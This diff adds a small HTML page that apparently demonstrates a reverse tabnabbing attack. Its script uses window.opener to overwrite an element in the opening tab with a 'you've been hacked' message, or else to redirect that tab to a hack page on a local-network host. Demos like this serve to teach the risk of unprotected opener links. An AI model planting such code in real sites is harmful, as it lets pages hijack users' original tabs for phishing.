@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<div>
+    go back to index
+</div>
+
+<script>
+    console.log(window.opener)
+    if(window.opener) {
+        if(window.opener.document) {
+            window.opener.document.getElementById("hacking").innerHTML = '哈哈哈哈, 你被hack啦'
+        } else if(window.opener.location) {
+            window.opener.location = "http://192.168.31.200:8080/a/hack.html"
+        } else {
+            alert("没有合适的opener属性")
+        }
+    } else {
+        alert("没有opener对象")
+    }
+
+</script>
+
+</body>
+</html>
